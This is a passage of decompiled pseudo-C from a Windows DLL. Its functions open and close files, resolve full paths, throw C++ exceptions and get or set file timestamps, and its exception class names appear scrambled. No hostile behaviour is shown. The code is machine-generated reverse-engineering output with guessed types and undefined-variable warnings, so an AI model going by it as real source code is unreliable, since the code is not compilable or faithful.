        &v13,
        (HANDLE *)HIDWORD(v17),
        (struct _FILETIME *)(HIDWORD(v17) + 56));
      v3[19] = 1;
      v3[16] = 1;
    }
    sub_10017DBD(v3);
    if ( v18 )
    {
      (*(void (__thiscall **)(_DWORD *))(*v3 + 116))(v3);
      (*(void (__thiscall **)(_DWORD *, _DWORD *, _DWORD))(*v3 + 84))(v3, v3 + 10, v3[12]);
      LOBYTE(v19) = 4;
      v8 = v6;
      v7 = v6;
      HIDWORD(v17) = &v7;
      sub_10018B3B(&v7);
      LOBYTE(v19) = 4;
      sub_10017C15(7, 256, v11, (int)v15, 0x2000000, 3, (int)v7, v8);
      LOBYTE(v19) = 6;
      sub_10017DBD(v11);
      sub_100181B5((HANDLE *)v11, &v16, 1);
      LOBYTE(v19) = 4;
      sub_10017D5E((int)v11);
      v19 = 1;
    }
    LOBYTE(v19) = 0;
    sub_10009F65(v15);
    v19 = -1;
    sub_10009F65(v14);
  }
}
// 1001737C: variable 'v6' is possibly undefined
// 10017229: using guessed type _DWORD pExceptionObject[4];

//----- (10017404) --------------------------------------------------------
void __thiscall sub_10017404(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_1002D422(this + 3);
  sub_1000DF1A(v1);
}

//----- (10017417) --------------------------------------------------------
_DWORD *__thiscall sub_10017417(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10073C3C;
    this[2] = &unk_10073C44;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 3, v4);
  }
  sub_1001748D(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10073C34;
  return this;
}
// 10073C34: using guessed type int (__stdcall *off_10073C34)(char);

//----- (1001748D) --------------------------------------------------------
_DWORD *__thiscall sub_1001748D(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10073C24;
    this[2] = &unk_10073C2C;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 3, v4);
  }
  sub_1000936A(this, a2, 0);
  sub_1000CC4F(this + 2, a2 != 0 ? (unsigned int)(a2 + 2) : 0, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10073C1C;
  return this;
}
// 10073C1C: using guessed type int (__stdcall *off_10073C1C)(char);

//----- (1001751D) --------------------------------------------------------
char *__thiscall sub_1001751D(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_10017404(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1001753F) --------------------------------------------------------
char *__thiscall sub_1001753F(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_10017561(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10017561) --------------------------------------------------------
void __thiscall sub_10017561(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_1002D376(this + 3);
  sub_1000DF1A(v1);
}

//----- (10017574) --------------------------------------------------------
int __thiscall sub_10017574(HANDLE *this)
{
  (*((void (__thiscall **)(HANDLE *))*this + 29))(this);
  return sub_10017F33(this);
}

//----- (10017584) --------------------------------------------------------
int __thiscall sub_10017584(HANDLE *this, const FILETIME *a2, int a3)
{
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    sub_1000E1AC(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
  }
  this[14] = (HANDLE)a2->dwLowDateTime;
  this[15] = (HANDLE)a2->dwHighDateTime;
  this[16] = (HANDLE)a3;
  return sub_100181B5(this, a2, a3);
}
// 10017584: using guessed type _DWORD pExceptionObject[2];

//----- (100175CE) --------------------------------------------------------
int __thiscall sub_100175CE(HANDLE *this, const FILETIME *a2, int a3)
{
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    sub_1000E1AC(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
  }
  this[17] = (HANDLE)a2->dwLowDateTime;
  this[18] = (HANDLE)a2->dwHighDateTime;
  this[19] = (HANDLE)a3;
  return sub_10018246(this, a2, a3);
}
// 100175CE: using guessed type _DWORD pExceptionObject[2];

//----- (10017618) --------------------------------------------------------
int __thiscall sub_10017618(_DWORD *this)
{
  int result; // eax

  result = (*(int (__thiscall **)(_DWORD *))(*this + 12))(this);
  if ( (_BYTE)result )
  {
    result = (*(int (__thiscall **)(_DWORD *))(*this + 120))(this);
    if ( (_BYTE)result )
    {
      (*(void (__thiscall **)(_DWORD *, _DWORD *, _DWORD))(*this + 92))(this, this + 14, this[16]);
      return (*(int (__thiscall **)(_DWORD *, _DWORD *, _DWORD))(*this + 100))(this, this + 17, this[19]);
    }
  }
  return result;
}

//----- (1001764D) --------------------------------------------------------
BOOL __thiscall sub_1001764D(_DWORD *this)
{
  return (this[4] & 0x40000100) != 0;
}

//----- (1001765C) --------------------------------------------------------
int __thiscall sub_1001765C(void *this, char a2)
{
  sub_10018778(this, a2);
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 116))(this);
}

//----- (10017676) --------------------------------------------------------
int __thiscall sub_10017676(HANDLE *this, _DWORD *NumberOfBytesWritten)
{
  sub_100187B9(this, NumberOfBytesWritten);
  return (*((int (__thiscall **)(HANDLE *))*this + 29))(this);
}

//----- (10017690) --------------------------------------------------------
int __thiscall sub_10017690(HANDLE *this)
{
  sub_100189E4(this);
  return (*((int (__thiscall **)(HANDLE *))*this + 29))(this);
}

//----- (100176D0) --------------------------------------------------------
int __thiscall sub_100176D0(
        _DWORD *this,
        int a2,
        int a3,
        int a4,
        void *Block,
        _DWORD **a6,
        _DWORD *a7,
        volatile LONG *lpAddend)
{
  _DWORD *v9; // ecx
  _DWORD *v10; // esi
  int *v11; // eax
  int *v12; // eax
  int v13; // eax
  int v15; // [esp-10h] [ebp-34h]
  _DWORD *v16; // [esp-8h] [ebp-2Ch] BYREF
  volatile LONG *v17; // [esp-4h] [ebp-28h]
  int v18[4]; // [esp+10h] [ebp-14h] BYREF
  int v19; // [esp+20h] [ebp-4h]

  v19 = 1;
  v17 = &a3;
  v16 = (_DWORD *)(a2 + 4);
  *(_DWORD *)a2 = off_10073CCC;
  sub_10009F32(v16, (int)v17);
  v9 = a7;
  v17 = lpAddend;
  *(_DWORD *)(a2 + 16) = lpAddend;
  *(_DWORD *)(a2 + 12) = v9;
  InterlockedIncrement(v17);
  sub_10004726((_DWORD *)(a2 + 24), 0);
  sub_1000C043((_DWORD *)(a2 + 32));
  sub_1000C093((_DWORD *)(a2 + 40));
  LOBYTE(v19) = 6;
  *(_DWORD *)(a2 + 56) = Block;
  *(_DWORD *)(a2 + 60) = a6;
  *(_DWORD *)(a2 + 64) = 0;
  if ( this[1] || *this )
  {
    v10 = (_DWORD *)(a2 + 48);
    *(_DWORD *)(a2 + 48) = *this;
    *(_DWORD *)(a2 + 52) = this[1];
  }
  else
  {
    v10 = (_DWORD *)(a2 + 48);
    GetSystemTimeAsFileTime((LPFILETIME)(a2 + 48));
  }
  v11 = sub_1001A2B6(v18, a2 + 4);
  LOBYTE(v19) = 7;
  sub_100021B1(v11 + 1, (int *)(a2 + 8));
  LOBYTE(v19) = 6;
  sub_10009F65(v18);
  if ( sub_1001A327(a2 + 4) )
  {
    v12 = sub_1001A1AE(v18, a2 + 4);
    LOBYTE(v19) = 8;
    sub_100021B1(v12 + 1, (int *)(a2 + 8));
    LOBYTE(v19) = 6;
    sub_10009F65(v18);
  }
  Block = operator new(0x50u);
  LOBYTE(v19) = 9;
  if ( Block )
  {
    a6 = &v16;
    v17 = lpAddend;
    v16 = a7;
    InterlockedIncrement(lpAddend);
    LOBYTE(v19) = 10;
    v15 = *(_DWORD *)(a2 + 56);
    LOBYTE(v19) = 9;
    v13 = sub_1001700E((int)Block, a2 + 4, v10, v15, 3, (int)v16, v17);
  }
  else
  {
    v13 = 0;
  }
  LOBYTE(v19) = 6;
  sub_10017BCF((_DWORD *)(a2 + 24), v13);
  if ( sub_1001A327(a2 + 4) )
  {
    sub_10017A84(a2);
    *(_BYTE *)(a2 + 20) = 1;
  }
  else
  {
    *(_BYTE *)(a2 + 20) = 0;
    sub_10017BCF((_DWORD *)(a2 + 24), 0);
  }
  LOBYTE(v19) = 0;
  sub_10009F65(&a3);
  v19 = -1;
  sub_10003D24(&a7);
  return a2;
}
// 10073CCC: using guessed type int (*off_10073CCC[5])();
// 100176D0: using guessed type int var_14[4];

//----- (10017870) --------------------------------------------------------
int __thiscall sub_10017870(int this)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  if ( !*(_BYTE *)(this + 20) )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  return *(_DWORD *)(this + 32);
}
// 10017870: using guessed type _DWORD pExceptionObject[2];

//----- (10017897) --------------------------------------------------------
int __thiscall sub_10017897(int this)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  if ( !*(_BYTE *)(this + 20) )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  return *(_DWORD *)(this + 40);
}
// 10017897: using guessed type _DWORD pExceptionObject[2];

//----- (100178BE) --------------------------------------------------------
int __thiscall sub_100178BE(int this)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  if ( !*(_BYTE *)(this + 20) )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 24) + 72))(*(_DWORD *)(this + 24));
}
// 100178BE: using guessed type _DWORD pExceptionObject[2];

//----- (100178EA) --------------------------------------------------------
unsigned int __thiscall sub_100178EA(_BYTE *this)
{
  unsigned int result; // eax
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  result = 0;
  if ( !this[20] )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  if ( *((_DWORD *)this + 15) )
  {
    if ( !*((_DWORD *)this + 16) )
      (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 12))(this);
    result = (unsigned int)(*((_DWORD *)this + 16) + 1) / *((_DWORD *)this + 15);
    *((_DWORD *)this + 16) = (unsigned int)(*((_DWORD *)this + 16) + 1) % *((_DWORD *)this + 15);
  }
  return result;
}
// 100178EA: using guessed type _DWORD pExceptionObject[2];

//----- (1001792E) --------------------------------------------------------
int __thiscall sub_1001792E(int this)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  if ( !*(_BYTE *)(this + 20) )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 24) + 112))(*(_DWORD *)(this + 24));
}
// 1001792E: using guessed type _DWORD pExceptionObject[2];

//----- (1001795A) --------------------------------------------------------
int __thiscall sub_1001795A(int this, unsigned int a2)
{
  unsigned int v3; // edi
  int result; // eax
  _DWORD pExceptionObject[2]; // [esp+8h] [ebp-8h] BYREF

  if ( !*(_BYTE *)(this + 20) )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 24) + 68))(*(_DWORD *)(this + 24));
  (*(void (__thiscall **)(_DWORD, unsigned int, _DWORD))(**(_DWORD **)(this + 24) + 64))(*(_DWORD *)(this + 24), a2, 0);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 24) + 76))(*(_DWORD *)(this + 24));
  if ( v3 <= a2 )
    return (*(int (__thiscall **)(_DWORD, unsigned int, _DWORD))(**(_DWORD **)(this + 24) + 64))(
             *(_DWORD *)(this + 24),
             v3,
             0);
  return result;
}
// 1001795A: using guessed type _DWORD pExceptionObject[2];

//----- (100179B5) --------------------------------------------------------
char __thiscall sub_100179B5(_BYTE *this)
{
  return this[20];
}

//----- (100179B9) --------------------------------------------------------
int __thiscall sub_100179B9(int *this, volatile LONG *a2)
{
  volatile LONG *v3; // ecx
  int v4; // eax
  int v5; // eax
  int v7; // [esp-10h] [ebp-38h]
  volatile LONG *v8; // [esp-8h] [ebp-30h] BYREF
  volatile LONG *v9; // [esp-4h] [ebp-2Ch]
  void *pExceptionObject[2]; // [esp+10h] [ebp-18h] BYREF
  void *Block; // [esp+18h] [ebp-10h]
  int v12; // [esp+24h] [ebp-4h]

  if ( *((_BYTE *)this + 20) )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  Block = operator new(0x50u);
  v12 = 0;
  if ( Block )
  {
    v8 = v9;
    v9 = (volatile LONG *)this[4];
    v3 = (volatile LONG *)this[3];
    pExceptionObject[1] = &v8;
    v8 = v3;
    InterlockedIncrement(v9);
    LOBYTE(v12) = 1;
    v7 = this[14];
    LOBYTE(v12) = 0;
    v4 = sub_1001700E((int)Block, (int)(this + 1), this + 12, v7, 2, (int)v8, v9);
  }
  else
  {
    v4 = 0;
  }
  v12 = -1;
  sub_10017BCF(this + 6, v4);
  sub_10017A84((int)this);
  (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)this[6] + 84))(this[6], this + 12, this[14]);
  v9 = a2;
  v5 = *this;
  *((_BYTE *)this + 20) = 1;
  return (*(int (__thiscall **)(int *, volatile LONG *))(v5 + 20))(this, v9);
}

//----- (10017A6B) --------------------------------------------------------
DWORD __thiscall sub_10017A6B(int this)
{
  int v2; // ecx

  v2 = *(_DWORD *)(this + 24);
  *(_BYTE *)(this + 20) = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 8))(v2);
  return sub_1001A942(this + 4);
}

//----- (10017A84) --------------------------------------------------------
void __usercall sub_10017A84(int a1@<esi>)
{
  int v1; // eax
  volatile LONG *v2; // ecx
  volatile LONG *v3; // ecx
  int v4; // eax
  volatile LONG *v5; // [esp-8h] [ebp-2Ch] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-28h]
  volatile LONG **v7; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v9; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 24) + 4))(*(_DWORD *)(a1 + 24));
  Block = operator new(0x14u);
  v1 = 0;
  v9 = 0;
  if ( Block )
  {
    v5 = v6;
    v6 = *(volatile LONG **)(a1 + 28);
    v2 = *(volatile LONG **)(a1 + 24);
    v7 = &v5;
    v5 = v2;
    InterlockedIncrement(v6);
    LOBYTE(v9) = 0;
    v1 = sub_1000EDD7((int)Block, (int)v5, v6);
  }
  v9 = -1;
  sub_1000C0E3((_DWORD *)(a1 + 32), v1);
  Block = operator new(0x14u);
  v9 = 2;
  if ( Block )
  {
    v5 = v6;
    v6 = *(volatile LONG **)(a1 + 28);
    v3 = *(volatile LONG **)(a1 + 24);
    v7 = &v5;
    v5 = v3;
    InterlockedIncrement(v6);
    LOBYTE(v9) = 2;
    v4 = sub_1001B84C((int)Block, (int)v5, v6);
  }
  else
  {
    v4 = 0;
  }
  v9 = -1;
  sub_1000C126((_DWORD *)(a1 + 40), v4);
}

//----- (10017B3D) --------------------------------------------------------
int *__thiscall sub_10017B3D(void *this, int *a2)
{
  sub_10017B71(a2, (int)this + 4);
  return a2;
}

//----- (10017B71) --------------------------------------------------------
int *__cdecl sub_10017B71(int *a1, int a2)
{
  sub_10009F32(a1, a2);
  sub_1000A588(a1, 92);
  sub_1000A588(a1, 58);
  sub_1000A531(a1);
  return a1;
}

//----- (10017BCF) --------------------------------------------------------
void __usercall sub_10017BCF(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_100047B5((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}

//----- (10017C15) --------------------------------------------------------
_DWORD *__userpurge sub_10017C15@<eax>(
        int a1@<ebx>,
        int a2@<edi>,
        _DWORD *a3,
        int a4,
        int a5,
        int a6,
        int a7,
        volatile LONG *lpAddend)
{
  volatile LONG *v8; // eax
  int v9; // ecx

  a3[1] = -1;
  *a3 = &off_10073D40;
  sub_10009F32(a3 + 2, a4);
  v8 = lpAddend;
  v9 = a7;
  a3[4] = a2;
  a3[6] = v8;
  a3[5] = v9;
  InterlockedIncrement(v8);
  a3[7] = a5;
  if ( a1 == -1 )
    a3[8] = 3;
  else
    a3[8] = a1;
  if ( a6 != -1 )
  {
    a3[9] = a6;
    goto LABEL_15;
  }
  switch ( a2 )
  {
    case -2147483648:
    case -2147483392:
      goto LABEL_13;
    case -1073741824:
      a3[9] = 4;
      break;
    case 0:
    case 256:
LABEL_13:
      a3[9] = 3;
      break;
    case 1073741824:
      a3[9] = 2;
      break;
  }
LABEL_15:
  sub_10003D24(&a7);
  return a3;
}
// 10073D40: using guessed type int (__thiscall *off_10073D40)(void *Block, char);

//----- (10017CD6) --------------------------------------------------------
void *__thiscall sub_10017CD6(void *Block, char a2)
{
  sub_10017D5E((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10017CF5) --------------------------------------------------------
_DWORD *__userpurge sub_10017CF5@<eax>(_DWORD *a1@<edi>, _DWORD *a2)
{
  volatile LONG *v3; // [esp-4h] [ebp-20h]

  a2[1] = -1;
  *a2 = &off_10073D40;
  sub_10009F32(a2 + 2, (int)(a1 + 2));
  a2[4] = a1[4];
  a2[6] = a1[6];
  v3 = (volatile LONG *)a2[6];
  a2[5] = a1[5];
  InterlockedIncrement(v3);
  a2[7] = a1[7];
  a2[8] = a1[8];
  a2[9] = a1[9];
  return a2;
}
// 10073D40: using guessed type int (__thiscall *off_10073D40)(void *Block, char);

//----- (10017D5E) --------------------------------------------------------
void __thiscall sub_10017D5E(int this)
{
  *(_DWORD *)this = &off_10073D40;
  if ( *(_DWORD *)(this + 4) != -1 )
    sub_10017F33((HANDLE *)this);
  sub_10003D24((void *)(this + 20));
  sub_10009F65((int *)(this + 8));
}
// 10073D40: using guessed type int (__thiscall *off_10073D40)(void *Block, char);

//----- (10017DBD) --------------------------------------------------------
char __thiscall sub_10017DBD(_DWORD *this)
{
  HANDLE FileW; // eax
  bool v3; // bl
  DWORD v4; // eax
  _DWORD v6[4]; // [esp+10h] [ebp-40h] BYREF
  _DWORD v7[4]; // [esp+20h] [ebp-30h] BYREF
  _DWORD pExceptionObject[7]; // [esp+30h] [ebp-20h] BYREF

  LOBYTE(FileW) = (*(int (__thiscall **)(_DWORD *))(*this + 12))(this);
  if ( !(_BYTE)FileW )
  {
    v3 = sub_1001A327((int)(this + 2));
    FileW = CreateFileW(
              *(LPCWSTR *)(this[3] + 12),
              this[4],
              this[8],
              *(LPSECURITY_ATTRIBUTES *)(this[5] + 4),
              this[9],
              this[7],
              0);
    if ( FileW == (HANDLE)-1 )
    {
      v4 = GetLastError() - 2;
      if ( v4 )
      {
        if ( v4 != 78 )
        {
          sub_1002D306(pExceptionObject, 1);
          _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
        }
        sub_1002D44E(v7);
        _CxxThrowException(v7, (_ThrowInfo *)&_TI5_AVBjzgFbjdoadXvizrkOkabjzgfb_jhzi_sr__);
      }
      sub_1002D3CB(v6);
      _CxxThrowException(v6, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    this[1] = FileW;
    if ( !v3 )
    {
      LOBYTE(FileW) = sub_1000F8D3();
      if ( (_BYTE)FileW == 1 )
        LOBYTE(FileW) = sub_1001B1FC((int)(this + 2));
    }
  }
  return (char)FileW;
}
// 100761F8: using guessed type __TI_flags _TI5_AVBjzgFbjdoadXvizrkOkabjzgfb_jhzi_sr__;
// 10017DBD: using guessed type _DWORD pExceptionObject[7];
// 10017DBD: using guessed type _DWORD var_30[4];
// 10017DBD: using guessed type _DWORD var_40[4];

//----- (10017E88) --------------------------------------------------------
void __thiscall sub_10017E88(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_1002D4A5(this + 3);
  sub_1000DF1A(v1);
}

//----- (10017E9B) --------------------------------------------------------
_DWORD *__thiscall sub_10017E9B(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10073CFC;
    this[2] = &unk_10073D04;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 3, v4);
  }
  sub_1001748D(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10073CF4;
  return this;
}
// 10073CF4: using guessed type int (__stdcall *off_10073CF4)(char);

//----- (10017F11) --------------------------------------------------------
char *__thiscall sub_10017F11(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_10017E88(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10017F33) --------------------------------------------------------
int __thiscall sub_10017F33(HANDLE *this)
{
  int result; // eax
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  result = (*((int (__thiscall **)(HANDLE *))*this + 3))(this);
  if ( (_BYTE)result )
  {
    result = CloseHandle(this[1]);
    if ( !result )
    {
      sub_1002D306(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
    this[1] = (HANDLE)-1;
  }
  return result;
}
// 10017F33: using guessed type _DWORD pExceptionObject[4];

//----- (10017F73) --------------------------------------------------------
BOOL __thiscall sub_10017F73(_DWORD *this)
{
  return this[1] != -1;
}

//----- (10017F7D) --------------------------------------------------------
int __thiscall sub_10017F7D(_DWORD *this)
{
  return this[1];
}

//----- (10017F81) --------------------------------------------------------
char *__thiscall sub_10017F81(char *this)
{
  return this + 8;
}

//----- (10017F85) --------------------------------------------------------
int *__thiscall sub_10017F85(_DWORD *this, int *a2)
{
  DWORD FullPathNameW; // eax
  const WCHAR *v4; // edi
  WCHAR *v5; // eax
  DWORD v6; // edi
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-2Ch] BYREF
  LPWSTR FilePart; // [esp+20h] [ebp-1Ch] BYREF
  int v10; // [esp+24h] [ebp-18h]
  DWORD nBufferLength; // [esp+28h] [ebp-14h] BYREF
  WCHAR Buffer[6]; // [esp+2Ch] [ebp-10h] BYREF
  int v13; // [esp+38h] [ebp-4h]

  v13 = 0;
  v10 = 0;
  FullPathNameW = GetFullPathNameW(*(LPCWSTR *)(this[3] + 12), 0, Buffer, &FilePart);
  nBufferLength = FullPathNameW;
  if ( !FullPathNameW
    || (sub_10009D9C(FullPathNameW + 2, a2),
        v13 = 0,
        v4 = *(const WCHAR **)(this[3] + 12),
        v10 = 1,
        v5 = (WCHAR *)sub_1000A1E4(a2),
        v6 = GetFullPathNameW(v4, nBufferLength, v5, &FilePart),
        sub_1000A223((int)a2),
        !v6) )
  {
    sub_1002D306(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  if ( v6 > nBufferLength + 1 )
  {
    sub_1000DEEF(&nBufferLength);
    _CxxThrowException(&nBufferLength, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return a2;
}
// 10017F85: using guessed type WCHAR Buffer[6];
// 10017F85: using guessed type _DWORD pExceptionObject[4];

//----- (10018031) --------------------------------------------------------
int __thiscall sub_10018031(_DWORD *this)
{
  return this[4];
}

//----- (10018035) --------------------------------------------------------
_DWORD *__thiscall sub_10018035(_DWORD *this, _DWORD *a2)
{
  volatile LONG *v3; // [esp-4h] [ebp-24h]

  a2[1] = this[6];
  v3 = (volatile LONG *)a2[1];
  *a2 = this[5];
  InterlockedIncrement(v3);
  return a2;
}

//----- (10018071) --------------------------------------------------------
int __thiscall sub_10018071(_DWORD *this)
{
  return this[7];
}

//----- (10018075) --------------------------------------------------------
int __thiscall sub_10018075(_DWORD *this)
{
  return this[8];
}

//----- (10018079) --------------------------------------------------------
int __thiscall sub_10018079(_DWORD *this)
{
  return this[9];
}

//----- (1001807D) --------------------------------------------------------
int __userpurge sub_1001807D@<eax>(
        HANDLE *a1@<esi>,
        FILETIME *lpCreationTime,
        FILETIME *lpLastAccessTime,
        FILETIME *lpLastWriteTime)
{
  char v4; // al
  bool v5; // bl
  int result; // eax
  int v7; // edi
  _DWORD pExceptionObject[5]; // [esp+8h] [ebp-14h] BYREF

  v4 = (*((int (__thiscall **)(HANDLE *))*a1 + 3))(a1);
  v5 = v4 == 0;
  if ( !v4 )
    (*((void (__thiscall **)(HANDLE *))*a1 + 1))(a1);
  result = SetFileTime(a1[1], lpCreationTime, lpLastAccessTime, lpLastWriteTime);
  v7 = result;
  if ( v5 )
    result = (*((int (__thiscall **)(HANDLE *))*a1 + 2))(a1);
  if ( !v7 )
  {
    sub_1002D306(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  return result;
}
// 1001807D: using guessed type _DWORD pExceptionObject[5];

//----- (100180DF) --------------------------------------------------------
_QWORD *__thiscall sub_100180DF(HANDLE *this, _QWORD *a2, int a3)
{
  struct _FILETIME v3; // rax
  DWORD dwLowDateTime; // ecx
  _QWORD *result; // eax
  struct _FILETIME v6; // [esp+10h] [ebp-18h] BYREF
  struct _FILETIME v7; // [esp+18h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+20h] [ebp-8h] BYREF

  sub_1001847C(&v8, &v6, this, &v7);
  v3 = sub_1001856E(&v6, 1, a3);
  dwLowDateTime = v3.dwLowDateTime;
  result = a2;
  *a2 = __PAIR64__(v3.dwHighDateTime, dwLowDateTime);
  return result;
}

//----- (10018120) --------------------------------------------------------
int __thiscall sub_10018120(HANDLE *this, const FILETIME *a2, int a3)
{
  FILETIME CreationTime; // [esp+10h] [ebp-20h] BYREF
  FILETIME LastWriteTime; // [esp+18h] [ebp-18h] BYREF
  FILETIME LastAccessTime; // [esp+20h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+28h] [ebp-8h] BYREF

  sub_1001847C(&LastAccessTime, &v8, this, &LastWriteTime);
  CreationTime = sub_1001856E(a2, a3, 1);
  return sub_1001807D(this, &CreationTime, &LastAccessTime, &LastWriteTime);
}

//----- (10018172) --------------------------------------------------------
_QWORD *__thiscall sub_10018172(HANDLE *this, _QWORD *a2, int a3)
{
  struct _FILETIME v3; // rax
  DWORD dwLowDateTime; // ecx
  _QWORD *result; // eax
  struct _FILETIME v6; // [esp+10h] [ebp-18h] BYREF
  struct _FILETIME v7; // [esp+18h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+20h] [ebp-8h] BYREF

  sub_1001847C(&v7, &v8, this, &v6);
  v3 = sub_1001856E(&v6, 1, a3);
  dwLowDateTime = v3.dwLowDateTime;
  result = a2;
  *a2 = __PAIR64__(v3.dwHighDateTime, dwLowDateTime);
  return result;
}

//----- (100181B5) --------------------------------------------------------
int __thiscall sub_100181B5(HANDLE *this, const FILETIME *a2, int a3)
{
  FILETIME LastWriteTime; // [esp+10h] [ebp-20h] BYREF
  FILETIME LastAccessTime; // [esp+18h] [ebp-18h] BYREF
  FILETIME CreationTime; // [esp+20h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+28h] [ebp-8h] BYREF

  sub_1001847C(&LastAccessTime, &CreationTime, this, &v8);
  LastWriteTime = sub_1001856E(a2, a3, 1);
  return sub_1001807D(this, &CreationTime, &LastAccessTime, &LastWriteTime);
}

//----- (10018205) --------------------------------------------------------
_QWORD *__thiscall sub_10018205(HANDLE *this, _QWORD *a2, int a3)
{
  struct _FILETIME v3; // rax
  DWORD dwLowDateTime; // ecx
  _QWORD *result; // eax
  struct _FILETIME v6; // [esp+10h] [ebp-18h] BYREF
  struct _FILETIME v7; // [esp+18h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+20h] [ebp-8h] BYREF

  sub_1001847C(&v6, &v8, this, &v7);
  v3 = sub_1001856E(&v6, 1, a3);
  dwLowDateTime = v3.dwLowDateTime;
  result = a2;
  *a2 = __PAIR64__(v3.dwHighDateTime, dwLowDateTime);
  return result;
}

//----- (10018246) --------------------------------------------------------
int __thiscall sub_10018246(HANDLE *this, const FILETIME *a2, int a3)
{
  FILETIME LastAccessTime; // [esp+10h] [ebp-20h] BYREF
  FILETIME LastWriteTime; // [esp+18h] [ebp-18h] BYREF
